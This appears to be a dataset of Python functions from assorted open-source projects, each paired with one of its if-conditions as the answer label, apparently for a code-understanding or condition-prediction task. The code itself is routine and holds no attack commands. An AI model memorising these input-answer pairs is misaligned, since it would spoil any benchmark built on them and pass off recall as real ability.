{"input": "def get_word_parens_range(self, offset, opening=\"(\", closing=\")\"): end = self._find_word_end(offset) start_parens = self.code.index(opening, end) index = start_parens open_count = 0 while index < len(self.code): if self.code[index] == opening: open_count += 1 if self.code[index] == closing: open_count -= 1 if open_count == 0: return (start_parens, index + 1) index += 1 return (start_parens, index)", "label": "if open_count == 0 :"}
{"input": "def getNodeBySunid(self, sunid): \"\"\"Return a node from its sunid.\"\"\" if sunid in self._sunidDict: return self._sunidDict[sunid] if self.db_handle: self.getDomainFromSQL(sunid=sunid) if sunid in self._sunidDict: return self._sunidDict[sunid] else: return None", "label": "if sunid in self . _sunidDict :"}
{"input": "def get_cabal_in_dir(cabal_dir): \"\"\"Return .cabal file for cabal directory\"\"\" for entry in os.listdir(cabal_dir): if entry.endswith(\".cabal\"): project_name = os.path.splitext(entry)[0] return (project_name, os.path.join(cabal_dir, entry)) return (None, None)", "label": "if entry . endswith ( \".cabal\" ) :"}
{"input": "def authenticate(self, username, password): # The user entered an email, so try to log them in by e-mail emails = ContactValue.objects.filter( value=username, field__field_type=\"email\", contact__trash=False, contact__related_user__isnull=False, ) for email in emails: try: user = email.contact.related_user.user.user if user.check_password(password): return user except: pass return None", "label": "if user . check_password ( password ) :"}
{"input": "def get_art_abs(story_file): lines = read_text_file(story_file) lines = [line.lower() for line in lines] lines = [fix_missing_period(line) for line in lines] article_lines = [] highlights = [] next_is_highlight = False for idx, line in enumerate(lines): if line == \"\": continue # empty line elif line.startswith(\"@highlight\"): next_is_highlight = True elif next_is_highlight: highlights.append(line) else: article_lines.append(line) article = \" \".join(article_lines) abstract = \" \".join(highlights) return article, abstract", "label": "if line == \"\" :"}
{"input": "def find_token(self): found = False while not found: while self.data[self.index] in \" \\t\": self.index += 1 if self.data[self.index] == \"#\": while self.data[self.index] != \"\\n\": self.index += 1 if self.data[self.index] == \"\\n\": self.index += 1 else: found = True", "label": "if self . data [ self . index ] == \"#\" :"}
{"input": "def parseBamPEFDistributionFile(self, f): d = dict() lastsample = [] for line in f[\"f\"].splitlines(): cols = line.rstrip().split(\"\\t\") if cols[0] == \"#bamPEFragmentSize\": continue elif cols[0] == \"Size\": continue else: s_name = self.clean_s_name(cols[2].rstrip().split(\"/\")[-1], f[\"root\"]) if s_name != lastsample: d[s_name] = dict() lastsample = s_name d[s_name].update({self._int(cols[0]): self._int(cols[1])}) return d", "label": "if s_name != lastsample :"}
{"input": "def get_user_home(): if is_win(): if sys.platform == \"cygwin\": # Need the fully qualified directory output = ( subprocess.Popen( [\"cygpath\", \"-m\", os.path.expanduser(\"~\")], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, ) .communicate()[0] .rstrip() ) return output else: return os.environ[\"USERPROFILE\"] else: return os.path.expanduser(\"~\")", "label": "if sys . platform == \"cygwin\" :"}
{"input": "def _grouping_intervals(grouping): last_interval = None for interval in grouping: # if grouping is -1, we are done if interval == CHAR_MAX: return # 0: re-use last group ad infinitum if interval == 0: if last_interval is None: raise ValueError(\"invalid grouping\") while True: yield last_interval yield interval last_interval = interval", "label": "if interval == 0 :"}
{"input": "def remove_duplicates(model): for struct in model.structs: fields = [] names = [] for field in struct.fields: if field.name not in names: names.append(field.name) fields.append(field) struct.fields = fields", "label": "if field . name not in names :"}
{"input": "def set_multi(self, value): del self[atype] for addr in value: # Support assigning dictionary versions of addresses # instead of full Address objects. if not isinstance(addr, Address): if atype != \"all\": addr[\"type\"] = atype elif \"atype\" in addr and \"type\" not in addr: addr[\"type\"] = addr[\"atype\"] addrObj = Address() addrObj.values = addr addr = addrObj self.append(addr)", "label": "elif \"atype\" in addr and \"type\" not in addr :"}
{"input": "def import_directives(): files_list = os.listdir(os.path.dirname(__file__)) for directive_file in files_list: if not directive_file.endswith(\".py\") or directive_file.startswith(\"_\"): continue __import__( \"gixy.directives.\" + os.path.splitext(directive_file)[0], None, None, [\"\"] )", "label": "if not directive_file . endswith ( \".py\" ) or directive_file . startswith ( \"_\" ) :"}
{"input": "def _get_all_tasks(): proc = Popen([\"yarn\", \"--help\"], stdout=PIPE) should_yield = False for line in proc.stdout.readlines(): line = line.decode().strip() if \"Commands:\" in line: should_yield = True continue if should_yield and \"- \" in line: yield line.split(\" \")[-1]", "label": "if \"Commands:\" in line :"}
{"input": "def _waitFakenetStopped(self, timeoutsec=None): retval = False while True: if self._confirmFakenetStopped(): retval = True break time.sleep(1) if timeoutsec is not None: timeoutsec -= 1 if timeoutsec <= 0: break return retval", "label": "if timeoutsec is not None :"}
{"input": "def parse_compare_fail( string, rex=re.compile( r\"^(?P<field>min|max|mean|median|stddev|iqr):\" r\"((?P<percentage>[0-9]?[0-9])%|(?P<difference>[0-9]*\\.?[0-9]+([eE][-+]?[\" r\"0-9]+)?))$\" ), ): m = rex.match(string) if m: g = m.groupdict() if g[\"percentage\"]: return PercentageRegressionCheck(g[\"field\"], int(g[\"percentage\"])) elif g[\"difference\"]: return DifferenceRegressionCheck(g[\"field\"], float(g[\"difference\"])) raise argparse.ArgumentTypeError(\"Could not parse value: %r.\" % string)", "label": "if g [ \"percentage\" ] :"}
{"input": "def get_converter(self, key, default=None): \"\"\"Gets a converter for the given key.\"\"\" if key in self._vars: return self._vars[key].convert # necessary for keys that match regexes, such as `*PATH`s for k, var in self._vars.items(): if isinstance(k, str): continue if k.match(key) is not None: converter = var.convert self._vars[key] = var break else: converter = self._get_default_converter(default=default) return converter", "label": "if k . match ( key ) is not None :"}
{"input": "def get_model_params(problem_type: str, hyperparameters): penalty = hyperparameters.get(\"penalty\", L2) handle_text = hyperparameters.get(\"handle_text\", IGNORE) if problem_type == REGRESSION: if penalty == L2: model_class = Ridge elif penalty == L1: model_class = Lasso else: logger.warning( \"Unknown value for penalty {} - supported types are [l1, l2] - falling back to l2\".format( penalty ) ) penalty = L2 model_class = Ridge else: model_class = LogisticRegression return model_class, penalty, handle_text", "label": "elif penalty == L1 :"}
{"input": "def __init__(self, content=None, parent=None): Transformable.__init__(self, content, parent) self._items = [] for element in content: if not element.tag.startswith(namespace): continue tag = element.tag[len(namespace) :] if tag == \"g\": item = Group(element, self) elif tag == \"path\": item = Path(element, self) else: log.warn(\"Unhandled SVG tag (%s)\" % tag) continue self._items.append(item)", "label": "if tag == \"g\" :"}
{"input": "def f_context(args: argparse.Namespace): choice = args.choice ctx = utils.get_context() if choice is None: if ctx: group = ctx.stem print(f\"{group}: {' '.join(utils.get_groups()[group])}\") else: print(\"Context is not set\") elif choice == \"none\": # remove context ctx and ctx.unlink() else: # set context fname = Path(common.get_config_dir()) / (choice + \".context\") if ctx: ctx.rename(fname) else: open(fname, \"w\").close()", "label": "if ctx :"}
{"input": "def check_checksum(self): \"\"\"fix media checksums\"\"\" self.progress.set_pass( _(\"Updating checksums on media\"), len(self.db.get_media_handles()) ) for objectid in self.db.get_media_handles(): self.progress.step() obj = self.db.get_media_from_handle(objectid) full_path = media_path_full(self.db, obj.get_path()) new_checksum = create_checksum(full_path) if new_checksum != obj.checksum: logging.info(\"checksum: updating \" + obj.gramps_id) obj.checksum = new_checksum self.db.commit_media(obj, self.trans)", "label": "if new_checksum != obj . checksum :"}
{"input": "def get_default_backend(self, user_backends): retval = None n_defaults = 0 for name in user_backends: args = user_backends.get(name) if args.get(\"default\", False): n_defaults = n_defaults + 1 if retval is None: retval = name return (retval, n_defaults)", "label": "if retval is None :"}
{"input": "def on_mqtt_packet_received(self, *args, **kwargs): packet = kwargs.get(\"packet\") if packet: packet_size = packet.bytes_length self._stats[STAT_BYTES_RECEIVED] += packet_size self._stats[STAT_MSG_RECEIVED] += 1 if packet.fixed_header.packet_type == PUBLISH: self._stats[STAT_PUBLISH_RECEIVED] += 1", "label": "if packet . fixed_header . packet_type == PUBLISH :"}
{"input": "def func(self): if self.schema: d = {} for key in self._schema_keys: d[key] = getattr(self, key) # arbitrary keys if self._data: akeys = set(self._data.keys()) - set(d.keys()) for akey in akeys: d[akey] = self._data[akey] return d else: return None", "label": "if self . _data :"}
{"input": "def endElement(self, name, value, connection): if name == \"vpcId\": self.vpc_id = value elif name == \"value\": if value == \"true\": value = True else: value = False if self._current_attr == \"enableDnsHostnames\": self.enable_dns_hostnames = value elif self._current_attr == \"enableDnsSupport\": self.enable_dns_support = value", "label": "if self . _current_attr == \"enableDnsHostnames\" :"}
{"input": "def keyPressEvent(self, event): if event.key() in (Qt.Key_Right, Qt.Key_Left): direction = 1 if event.key() == Qt.Key_Left: direction = -1 if event.modifiers() == Qt.ShiftModifier: print(\"shift\") direction *= 10 self.timeline.setValue(self.timeline.value() + direction) else: super(VideoPlayerWidget, self).keyPressEvent(event)", "label": "if event . key ( ) == Qt . Key_Left :"}
{"input": "def find_config(pipeline_config_path: Union[str, Path]) -> Path: if not Path(pipeline_config_path).is_file(): configs = [ c for c in Path(__file__).parent.parent.parent.glob( f\"configs/**/{pipeline_config_path}.json\" ) if str(c.with_suffix(\"\")).endswith(pipeline_config_path) ] # a simple way to not allow * and ? if configs: log.info(f\"Interpreting '{pipeline_config_path}' as '{configs[0]}'\") pipeline_config_path = configs[0] return Path(pipeline_config_path)", "label": "if configs :"}
{"input": "def list_translations(dirname): if not os.path.isdir(dirname): return [] result = [] for entry in scandir(dirname): locale_dir = os.path.join(entry.path, \"LC_MESSAGES\") if not os.path.isdir(locale_dir): continue if any(filter(lambda x: x.name.endswith(\".mo\"), scandir(locale_dir))): result.append(Locale.parse(entry.name)) return result", "label": "if any ( filter ( lambda x : x . name . endswith ( \".mo\" ) , scandir ( locale_dir ) ) ) :"}
{"input": "def writeTo(self, writable): chunkStart = 0 fileSize = blob.properties.content_length while chunkStart < fileSize: chunkEnd = chunkStart + outer_self._maxAzureBlockBytes - 1 buf = container.get_blob_to_bytes( blob_name=str(jobStoreFileID), start_range=chunkStart, end_range=chunkEnd ).content if encrypted: buf = encryption.decrypt(buf, outer_self.keyPath) writable.write(buf) chunkStart = chunkEnd + 1", "label": "if encrypted :"}
{"input": "def get_extractor(name): for extractor in ALL_EXTRACTORS: if extractor[\"regex\"] in name.lower(): module = import_module( \"anime_downloader.extractors.{}\".format(extractor[\"modulename\"]) ) return getattr(module, extractor[\"class\"])", "label": "if extractor [ \"regex\" ] in name . lower ( ) :"}
{"input": "def updateSize(self): if self.size is not None: return height = 0 width = 0 for row in range(self.layout.rowCount()): row_height = 0 col_witdh = 0 for col in range(self.layout.columnCount()): item = self.layout.itemAt(row, col) if item: col_witdh += item.width() + 3 row_height = max(row_height, item.height()) width = max(width, col_witdh) height += row_height self.setGeometry(0, 0, width, height) return", "label": "if item :"}
{"input": "def close_group(self): \"\"\"Closes a grouping for previous filters\"\"\" if self._filters: if len(self._open_group_flag) < (len(self._close_group_flag) + 1): raise RuntimeError(\"Not enough open groups to close.\") if isinstance(self._filters[-1], ChainOperator): flt_sentence = self._filters[-2] else: flt_sentence = self._filters[-1] flt_sentence[1] = flt_sentence[1] + \")\" # closing the group self._close_group_flag.append(False) # flag a close group was added else: raise RuntimeError(\"No filters present. Can't close a group\") return self", "label": "if len ( self . _open_group_flag ) < ( len ( self . _close_group_flag ) + 1 ) :"}
{"input": "def test_name_conflicts(): # Test that we handle participants having the same name correctly. ev = fake_event() ev2 = fake_event() # Office365 sets the name to the email address when it's # not available. ev2.participants[0][\"email\"] = None ev2.participants[0][\"status\"] = \"yes\" merged_participants = ev._partial_participants_merge(ev2) assert len(merged_participants) == 2 for participant in merged_participants: if participant[\"email\"] is None: assert participant[\"status\"] == \"yes\" else: assert participant[\"name\"] == \"Ronald Zubar\"", "label": "if participant [ \"email\" ] is None :"}
{"input": "def set_idle(view, idle): vid = view.id() current_idle = vid in State[\"idle_views\"] if idle != current_idle: if idle: State[\"idle_views\"].add(vid) else: State[\"idle_views\"].discard(vid) toggle_demoted_regions(view, idle)", "label": "if idle :"}
{"input": "def _deserialize(self, value, attr, data, **kwargs): if isinstance(value, str): return [value, 0, 0] if isinstance(value, list) and len(value) == 3: condition = ( isinstance(value[0], str) and isinstance(value[1], int) and isinstance(value[1], int) ) if condition: return value raise ValidationError(\"This field expects a str or a list of [str, int, int].\")", "label": "if condition :"}
{"input": "def _struct(self, fields): result = {} for field in fields: if field[0] == \"__parent\": parent = self.instance(field[1]) if isinstance(parent, dict): result.update(parent) elif len(fields) == 1: result = parent else: result[field[0]] = parent else: result[field[0]] = self.instance(field[1]) return result", "label": "elif len ( fields ) == 1 :"}
{"input": "def validate(self): if \"accounts\" in self.data and self.data[\"accounts\"] == \"matched\": found = False for f in self.manager.iter_filters(): if isinstance(f, AmiCrossAccountFilter): found = True break if not found: raise PolicyValidationError( \"policy:%s filter:%s with matched requires cross-account filter\" % (self.manager.ctx.policy.name, self.type) )", "label": "if not found :"}
{"input": "def add_rule6(self, rule): if self.cleared: return self._lock.acquire() try: self._other6.append(rule) if not self._exists_iptables_rule(rule, ipv6=True): self._insert_iptables_rule(rule, ipv6=True) finally: self._lock.release()", "label": "if not self . _exists_iptables_rule ( rule , ipv6 = True ) :"}
{"input": "def load_grammar(self, *args): \"Load a grammar from a pickle file\" filename = askopenfilename( filetypes=self.GRAMMAR_FILE_TYPES, defaultextension=\".cfg\" ) if not filename: return try: if filename.endswith(\".pickle\"): with open(filename, \"rb\") as infile: grammar = pickle.load(infile) else: with open(filename, \"r\") as infile: grammar = CFG.fromstring(infile.read()) self.set_grammar(grammar) except Exception as e: tkinter.messagebox.showerror( \"Error Loading Grammar\", \"Unable to open file: %r\" % filename )", "label": "if filename . endswith ( \".pickle\" ) :"}
{"input": "def _join_printed_types(self, types): \"\"\"Pretty-print the union of the printed types.\"\"\" types = sorted(set(types)) # dedup if len(types) == 1: return next(iter(types)) elif types: if \"None\" in types: types.remove(\"None\") return \"Optional[%s]\" % self._join_printed_types(types) else: return \"Union[%s]\" % \", \".join(types) else: return \"nothing\"", "label": "if \"None\" in types :"}
{"input": "def __init__(self, **kwargs): for key, val in kwargs.items(): field = getattr(self.__class__, key, None) if field is None: raise TypeError( \"Field %r returned from raw SQL query does not have \" \"a column defined in the model\" % key ) setattr(self, field.get_attname() or key, field.to_python(val))", "label": "if field is None :"}
{"input": "def get_transaction_execution_results(self, batch_signature): with self._condition: batch_status = self._batch_statuses.get(batch_signature) if batch_status is None: return None annotated_batch = self._batch_by_id.get(batch_signature) if annotated_batch is None: return None results = [] for txn in annotated_batch.batch.transactions: result = self._txn_results.get(txn.header_signature) if result is not None: results.append(result) return results", "label": "if batch_status is None :"}
{"input": "def _check_params(self) -> None: if self.augmentation and self.ratio <= 0: raise ValueError(\"The augmentation ratio must be positive.\") if self.clip_values is not None: if len(self.clip_values) != 2: raise ValueError( \"`clip_values` should be a tuple of 2 floats or arrays containing the allowed data range.\" ) if np.array(self.clip_values[0] >= self.clip_values[1]).any(): raise ValueError(\"Invalid `clip_values`: min >= max.\")", "label": "if len ( self . clip_values ) != 2 :"}
{"input": "def ping_all(): for l in _all_listeners.values(): count = l.receiver.count() if count: for dev in l.receiver: dev.ping() l._status_changed(dev) count -= 1 if not count: break", "label": "if not count :"}
{"input": "def on_btOK_clicked(self, *a): \"\"\"Handler for OK button\"\"\" if self.ac_callback is not None: self._set_title() if self._mode == ActionEditor.AEC_MENUITEM: self.ac_callback(self.id, self) else: a = self.generate_modifiers( self._action, self._selected_component.NAME == \"custom\" ) self.ac_callback(self.id, a) self.ac_callback = None if self._selected_component: self._selected_component.on_ok(a) self.close()", "label": "if self . _selected_component :"}
{"input": "def apply_ssl(self, request): if self.ssl_protocol: if self.sslconf.protocol() != self.ssl_protocol: self.sslconf.setProtocol(self.ssl_protocol) QSslConfiguration.setDefaultConfiguration(self.sslconf) request.setSslConfiguration(self.sslconf) return request", "label": "if self . sslconf . protocol ( ) != self . ssl_protocol :"}
{"input": "def _iter_process_args(mapping, pid, max_depth): \"\"\"Iterator to traverse up the tree, yielding each process's argument list.\"\"\" for _ in range(max_depth): try: proc = mapping[pid] except KeyError: # We've reached the root process. Give up. break if proc.args: # Persumably the process should always have a name? yield proc.args pid = proc.ppid # Go up one level.", "label": "if proc . args :"}
{"input": "def store_data(self, store_loc, **kwargs): \"\"\"Put arrays to store\"\"\" # print(store_loc) g = self.store.create_group(store_loc) for ( k, v, ) in kwargs.items(): # print(type(v[0])) # print(k) if type(v) == list: if len(v) != 0: if type(v[0]) is np.str_ or type(v[0]) is str: v = [a.encode(\"utf8\") for a in v] g.create_dataset(k, data=v, compression=self.clib, compression_opts=self.clev)", "label": "if len ( v ) != 0 :"}
{"input": "def add_system_info_creds_to_config(creds): for user in creds: ConfigService.creds_add_username(creds[user][\"username\"]) if \"password\" in creds[user] and creds[user][\"password\"]: ConfigService.creds_add_password(creds[user][\"password\"]) if \"lm_hash\" in creds[user] and creds[user][\"lm_hash\"]: ConfigService.creds_add_lm_hash(creds[user][\"lm_hash\"]) if \"ntlm_hash\" in creds[user] and creds[user][\"ntlm_hash\"]: ConfigService.creds_add_ntlm_hash(creds[user][\"ntlm_hash\"])", "label": "if \"ntlm_hash\" in creds [ user ] and creds [ user ] [ \"ntlm_hash\" ] :"}
{"input": "def _format_arg(self, name, spec, value): if name == \"title\": if isinstance(value, bool) and value: return \"--title\" elif isinstance(value, str): return \"--title --title_text %s\" % (value,) else: raise ValueError('Unknown value for \"title\" argument: ' + str(value)) return super(Pik, self)._format_arg(name, spec, value)", "label": "if isinstance ( value , bool ) and value :"}
{"input": "def handle_friend(self): tokens, last = self._get_var_tokens_up_to(False, \"(\", \";\") if last.name == \"(\": tokens.append(last) self._add_back_tokens(tokens) token = self._get_next_token() while token.name in (\"inline\", \"typename\", \"::\"): token = self._get_next_token() result = self._generate_one(token) else: if tokens[0].name == \"class\": tokens = tokens[1:] result = self.converter.to_type(tokens)[0] assert result return Friend(result.start, result.end, result, self.namespace_stack)", "label": "if tokens [ 0 ] . name == \"class\" :"}
{"input": "def list_subtitles(self, video, languages): season = None episodes = [] if isinstance(video, Episode): titles = [video.series] + video.alternative_series season = video.season episodes = video.episodes else: titles = [video.title] + video.alternative_titles for title in titles: subtitles = [ s for l in languages for s in self.query( l, title, season=season, episodes=episodes, year=video.year ) ] if subtitles: return subtitles return []", "label": "if subtitles :"}
{"input": "def on_write_needed(self, nbytes, underflow): if underflow: self._handle_underflow() else: self._write_to_stream(nbytes) # Asynchronously update time if self._events: if self._time_sync_operation is not None and self._time_sync_operation.is_done: self._time_sync_operation.delete() self._time_sync_operation = None if self._time_sync_operation is None: assert _debug(\"PulseAudioPlayer: trigger timing info update\") self._time_sync_operation = self.stream.update_timing_info( self._process_events )", "label": "if self . _time_sync_operation is not None and self . _time_sync_operation . is_done :"}
{"input": "def _set_account_info(self): with session_scope(self.account_id) as db_session: account = db_session.query(ImapAccount).get(self.account_id) self.sync_state = account.sync_state self.provider = account.provider self.provider_info = account.provider_info self.email_address = account.email_address self.auth_handler = account.auth_handler if account.provider == \"gmail\": self.client_cls = GmailCrispinClient else: self.client_cls = CrispinClient", "label": "if account . provider == \"gmail\" :"}
{"input": "def make_timesheet_records(): employees = get_timesheet_based_salary_slip_employee() for e in employees: ts = make_timesheet( e.employee, simulate=True, billable=1, activity_type=get_random(\"Activity Type\"), company=frappe.flags.company, ) frappe.db.commit() rand = random.random() if rand >= 0.3: make_salary_slip_for_timesheet(ts.name) rand = random.random() if rand >= 0.2: make_sales_invoice_for_timesheet(ts.name)", "label": "if rand >= 0.3 :"}
{"input": "def free(self, addr, ban=0): with self.lock: if ban != 0: self.ban.append({\"addr\": addr, \"counter\": ban}) else: base, bit, is_allocated = self.locate(addr) if len(self.addr_map) <= base: raise KeyError(\"address is not allocated\") if self.addr_map[base] & (1 << bit): raise KeyError(\"address is not allocated\") self.allocated -= 1 self.addr_map[base] ^= 1 << bit", "label": "if ban != 0 :"}
{"input": "def flush_log(self): try: while len(self.log_buffer) > 0: level, message = self.log_buffer.pop(0) if level <= self.log_level: self._display_log(message, level) except IndexError: pass", "label": "if level <= self . log_level :"}
{"input": "def check(self): global MySQLdb import MySQLdb try: args = {} if mysql_user: args[\"user\"] = mysql_user if mysql_pwd: args[\"passwd\"] = mysql_pwd if mysql_host: args[\"host\"] = mysql_host if mysql_port: args[\"port\"] = mysql_port if mysql_socket: args[\"unix_socket\"] = mysql_socket self.db = MySQLdb.connect(**args) except Exception as e: raise Exception(\"Cannot interface with MySQL server: %s\" % e)", "label": "if mysql_port :"}
{"input": "def get_middleware_resolvers(middlewares): for middleware in middlewares: # If the middleware is a function instead of a class if inspect.isfunction(middleware): yield middleware if not hasattr(middleware, MIDDLEWARE_RESOLVER_FUNCTION): continue yield getattr(middleware, MIDDLEWARE_RESOLVER_FUNCTION)", "label": "if inspect . isfunction ( middleware ) :"}
{"input": "def get_sentence(self): while True: self._seed += 1 all_files = list(self._all_files) if self._shuffle: if self._n_gpus > 1: random.seed(self._seed) random.shuffle(all_files) for file_path in all_files: for ret in self._load_file(file_path): yield ret if self._mode == \"test\": break", "label": "if self . _shuffle :"}
{"input": "def extract_cookies(self, response, request): \"\"\"Extract cookies from response, where allowable given the request.\"\"\" _debug(\"extract_cookies: %s\", response.info()) self._cookies_lock.acquire() try: self._policy._now = self._now = int(time.time()) for cookie in self.make_cookies(response, request): if self._policy.set_ok(cookie, request): _debug(\" setting cookie: %s\", cookie) self.set_cookie(cookie) finally: self._cookies_lock.release()", "label": "if self . _policy . set_ok ( cookie , request ) :"}
{"input": "def _gen_filename(self, name): if name == \"in_average\": avg_subject = str(self.inputs.hemisphere) + \".EC_average\" avg_directory = os.path.join(self.inputs.subjects_dir, avg_subject) if not os.path.isdir(avg_directory): fs_home = os.path.abspath(os.environ.get(\"FREESURFER_HOME\")) return avg_subject elif name == \"out_file\": return self._list_outputs()[name] else: return None", "label": "if not os . path . isdir ( avg_directory ) :"}
{"input": "def decorated_view(*args, **kwargs): h = {} mechanisms = [(method, login_mechanisms.get(method)) for method in auth_methods] for method, mechanism in mechanisms: if mechanism and mechanism(): return fn(*args, **kwargs) elif method == \"basic\": r = _security.default_http_auth_realm h[\"WWW-Authenticate\"] = 'Basic realm=\"%s\"' % r if _security._unauthorized_callback: return _security._unauthorized_callback() else: return _get_unauthorized_response(headers=h)", "label": "elif method == \"basic\" :"}
{"input": "def _iterate_files(self, files, root, include_checksums, relpath): file_list = {} for file in files: exclude = False # exclude defined filename patterns for pattern in S3Sync.exclude_files: if fnmatch.fnmatch(file, pattern): exclude = True break if not exclude: full_path = root + \"/\" + file if include_checksums: # get checksum checksum = self._hash_file(full_path) else: checksum = \"\" file_list[relpath + file] = [full_path, checksum] return file_list", "label": "if not exclude :"}
{"input": "def attr(**kw): kw = kw.items() kw.sort() parts = [] for name, value in kw: if value is None: continue if name.endswith(\"_\"): name = name[:-1] parts.append('%s=\"%s\"' % (html_quote(name), html_quote(value))) return html(\" \".join(parts))", "label": "if name . endswith ( \"_\" ) :"}
{"input": "def create(self): if not self.created: self.created = True cmd = self._mode if cmd == MODE_ALL: cmd = u\"\" vim.command( (u\":%snoremap %s %s\" % (cmd, str(self), self.command)).encode(u\"utf-8\") )", "label": "if cmd == MODE_ALL :"}
{"input": "def get_tokens_unprocessed(self, text): for index, token, value in RegexLexer.get_tokens_unprocessed(self, text): if token is Name: if self.stdlibhighlighting and value in self.stdlib_types: token = Keyword.Type elif self.c99highlighting and value in self.c99_types: token = Keyword.Type elif self.platformhighlighting and value in self.linux_types: token = Keyword.Type yield index, token, value", "label": "if token is Name :"}
{"input": "def _merge_colormaps(kwargs): \"\"\"Merge colormaps listed in kwargs.\"\"\" from trollimage.colormap import Colormap full_cmap = None palette = kwargs[\"palettes\"] if isinstance(palette, Colormap): full_cmap = palette else: for itm in palette: cmap = create_colormap(itm) cmap.set_range(itm[\"min_value\"], itm[\"max_value\"]) if full_cmap is None: full_cmap = cmap else: full_cmap = full_cmap + cmap return full_cmap", "label": "if full_cmap is None :"}
{"input": "def from_text(cls, rdclass, rdtype, tok, origin=None, relativize=True): key_tag = tok.get_uint16() algorithm = tok.get_uint8() digest_type = tok.get_uint8() chunks = [] while 1: t = tok.get().unescape() if t.is_eol_or_eof(): break if not t.is_identifier(): raise dns.exception.SyntaxError chunks.append(t.value) digest = \"\".join(chunks) digest = digest.decode(\"hex_codec\") return cls(rdclass, rdtype, key_tag, algorithm, digest_type, digest)", "label": "if not t . is_identifier ( ) :"}
{"input": "def connect_reader_to_writer(reader, writer): BUF_SIZE = 8192 try: while True: data = await reader.read(BUF_SIZE) if not data: if not writer.transport.is_closing(): writer.write_eof() await writer.drain() return writer.write(data) await writer.drain() except (OSError, asyncio.IncompleteReadError) as e: pass", "label": "if not data :"}
{"input": "def _get_cuda_device(*args): # Returns cuda.Device or DummyDevice. for arg in args: if type(arg) is not bool and isinstance(arg, _integer_types): check_cuda_available() return Device(arg) if isinstance(arg, ndarray): if arg.device is None: continue return arg.device if available and isinstance(arg, Device): return arg # NOTE: This function returns DummyDevice for both NumPy and ChainerX return DummyDevice", "label": "if available and isinstance ( arg , Device ) :"}
{"input": "def skip_to_semicolon(s, i): n = len(s) while i < n: c = s[i] if c == \";\": return i elif c == \"'\" or c == '\"': i = g.skip_string(s, i) elif g.match(s, i, \"//\"): i = g.skip_to_end_of_line(s, i) elif g.match(s, i, \"/*\"): i = g.skip_block_comment(s, i) else: i += 1 return i", "label": "elif c == \"'\" or c == '\"' :"}
{"input": "def build_CallFunc(self, o): children = o.getChildren() # Build callee from first child callee = self.build(children[0]) # Build args and kwargs from remaining children args = [] kwargs = {} for child in children[1:]: class_name = child.__class__.__name__ # None is ignored if class_name == \"NoneType\": continue # Keywords become kwargs if class_name == \"Keyword\": kwargs.update(self.build(child)) # Everything else becomes args else: args.append(self.build(child)) return callee(*args, **kwargs)", "label": "if class_name == \"Keyword\" :"}
{"input": "def _extract_constant_functions(slither: SlitherCore) -> Dict[str, List[str]]: ret: Dict[str, List[str]] = {} for contract in slither.contracts: cst_functions = [ _get_name(f) for f in contract.functions_entry_points if _is_constant(f) ] cst_functions += [ v.function_name for v in contract.state_variables if v.visibility in [\"public\"] ] if cst_functions: ret[contract.name] = cst_functions return ret", "label": "if v . visibility in [ \"public\" ]"}
{"input": "def acquire_read_lock(self, wait=True): state = self.state if state.writing: raise LockError(\"lock is in writing state\") if state.reentrantcount == 0: x = self.do_acquire_read_lock(wait) if wait or x: state.reentrantcount += 1 state.reading = True return x elif state.reading: state.reentrantcount += 1 return True", "label": "if wait or x :"}
{"input": "def get_optional_nargs(self, name): for n, kwargs in self.conf[\"optional_args\"]: if name == n: if \"action\" in kwargs: action = kwargs[\"action\"] if action in (\"store_true\", \"store_false\"): return 0 break return 1", "label": "if name == n :"}
{"input": "def _requests_to_follow(self, response): if not isinstance(response, HtmlResponse): return seen = set() for n, rule in enumerate(self._rules): links = [ lnk for lnk in rule.link_extractor.extract_links(response) if lnk not in seen ] if links and rule.process_links: links = rule.process_links(links) for link in links: seen.add(link) request = self._build_request(n, link) yield rule._process_request(request, response)", "label": "if lnk not in seen"}
{"input": "def process_module(name, module, parent): if parent: modules[parent][\"items\"].append(name) mg = module_groups.setdefault(name, []) mg.append(parent) if get_module_type(name) == \"py3status\": module[\".group\"] = parent # check module content for k, v in list(module.items()): if k.startswith(\"on_click\"): # on_click event process_onclick(k, v, name) # on_click should not be passed to the module via the config. del module[k] if isinstance(v, ModuleDefinition): # we are a container module[\"items\"] = [] return module", "label": "if k . startswith ( \"on_click\" ) :"}
{"input": "def _mysql_version_validator(version, sku_info, tier): if version: versions = get_mysql_versions(sku_info, tier) if version not in versions: raise CLIError( \"Incorrect value for --version. Allowed values : {}\".format(versions) )", "label": "if version not in versions :"}
{"input": "def do_blocking_test(self, block_func, block_args, trigger_func, trigger_args): thread = _TriggerThread(trigger_func, trigger_args) thread.start() try: self.result = block_func(*block_args) # If block_func returned before our thread made the call, we failed! if not thread.startedEvent.is_set(): self.fail(\"blocking function '%r' appeared not to block\" % block_func) return self.result finally: thread.join(10) # make sure the thread terminates if thread.is_alive(): self.fail(\"trigger function '%r' appeared to not return\" % trigger_func)", "label": "if not thread . startedEvent . is_set ( ) :"}
{"input": "def _fatal_error(self, exc, message=\"Fatal error on pipe transport\"): try: if isinstance(exc, OSError): if self._loop.get_debug(): logger.debug(\"%r: %s\", self, message, exc_info=True) else: self._loop.call_exception_handler( { \"message\": message, \"exception\": exc, \"transport\": self, \"protocol\": self._protocol, } ) finally: self._force_close(exc)", "label": "if isinstance ( exc , OSError ) :"}
{"input": "def run_test_family(tests, mode_filter, files, open_func, *make_args): for test_func in tests: if test_func is None: out.write(\"\\n\") continue if mode_filter in test_func.file_open_mode: continue for s in test_func.file_sizes: name, size = files[size_names[s]] # name += file_ext args = tuple(f(name, size) for f in make_args) run_one_test(name, size, open_func, test_func, *args)", "label": "if test_func is None :"}
{"input": "def py__get__(self, obj): # Arguments in __get__ descriptors are obj, class. # `method` is the new parent of the array, don't know if that's good. names = self.get_function_slot_names(\"__get__\") if names: if isinstance(obj, AbstractInstanceContext): return self.execute_function_slots(names, obj, obj.class_context) else: none_obj = compiled.create(self.evaluator, None) return self.execute_function_slots(names, none_obj, obj) else: return ContextSet(self)", "label": "if isinstance ( obj , AbstractInstanceContext ) :"}
{"input": "def _options_fcheck(self, name, xflags, table): for entry in table: if entry.name is None: break if entry.flags & XTOPT_MAND and not xflags & (1 << entry.id): raise XTablesError(\"%s: --%s must be specified\" % (name, entry.name)) if not xflags & (1 << entry.id): continue", "label": "if entry . flags & XTOPT_MAND and not xflags & ( 1 << entry . id ) :"}
